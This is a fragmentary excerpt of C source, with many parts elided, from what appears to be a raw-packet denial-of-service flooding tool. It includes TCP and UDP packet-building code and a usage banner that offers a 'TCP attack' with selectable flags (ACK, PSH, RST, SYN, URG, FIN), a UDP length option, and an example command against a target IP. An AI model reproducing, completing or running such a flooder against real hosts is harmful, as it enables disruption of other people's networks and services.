...
send_tcp(u_char th_flags)
{
    ...
    packet.ip.ip_sum        = in_cksum((void *)&packet.ip,0);
...
{                      
    ...
    packet.udp.uh_ulen          = htons(sizeof(struct udphdr) + psize);
    packet.udp.uh_sum           = 0;
    SEND_PACKET();
}
static void
...
usage(const char *argv0)
{
	printf("%s \n", banner);
        ...
        printf("    -T TCP   attack                      \e[1;37m[\e[0m0:ACK   1:PSH\e[1;37m]\e[0m\n");
        printf("                                         \e[1;37m[\e[0m2:RST   3:SYN\e[1;37m]\e[0m\n");		
        printf("                                         \e[1;37m[\e[0m4:URG   5:FIN\e[1;37m]\e[0m\n");
        ...
        printf("    -x udp length                              \e[1;37m(\e[0m\e[0;31m1-65535\e[0m\e[1;37m)\e[0m\n");
    printf("\e[1musage\e[0m: %s -T0 -U -h 12.12.12.12 -x5\n", argv0);
    exit(-1);
}